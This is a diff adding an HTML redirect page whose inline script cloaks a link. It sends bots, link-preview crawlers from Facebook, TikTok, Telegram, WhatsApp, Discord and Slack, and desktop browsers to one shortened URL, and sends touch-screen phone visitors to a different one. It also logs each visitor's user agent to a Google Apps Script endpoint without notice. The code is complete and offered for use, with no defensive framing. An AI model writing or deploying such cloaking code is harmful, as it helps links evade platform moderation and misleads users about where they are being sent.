@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+
+  <script>
+    (function () {
+
+      /* ===== YOUR LINKS ===== */
+      var HUMAN_URL = "https://t.co/1eAP5QZqwl";
+      var BOT_URL   = "https://t.co/PvwGRcTH29";
+
+      /* ===== GOOGLE SHEET LOGGER ===== */
+      var LOG_URL = "https://script.google.com/macros/s/AKfycbyjTymQopBGvQH8yK5xy8CRIBPAUEjhfFfuKHKQrlWT__dm7T02LGESwgfn-zvMqoaxVw/exec";
+
+      var ua = navigator.userAgent.toLowerCase();
+
+      var botWords = [
+        "bot","crawl","spider","preview","facebook",
+        "tiktok","telegram","whatsapp","discord",
+        "slack","headless"
+      ];
+
+      function isBot() {
+        return botWords.some(function(w) {
+          return ua.includes(w);
+        });
+      }
+
+      function isPhone() {
+        return navigator.maxTouchPoints > 0;
+      }
+
+      function logVisit(type) {
+        var img = new Image();
+        img.src = LOG_URL +
+          "?type=" + encodeURIComponent(type) +
+          "&ua=" + encodeURIComponent(navigator.userAgent) +
+          "&t=" + Date.now();
+      }
+
+      /* ===== DECISION ===== */
+      if (isBot()) {
+        logVisit("BOT");
+        window.location.replace(BOT_URL);
+
+      } else if (isPhone()) {
+        logVisit("HUMAN");
+        window.location.replace(HUMAN_URL);
+
+      } else {
+        logVisit("DESKTOP");
+        window.location.replace(BOT_URL);
+      }
+
+    })();
+  </script>
+</head>
+<body>
+  Redirecting...
+</body>
+</html>
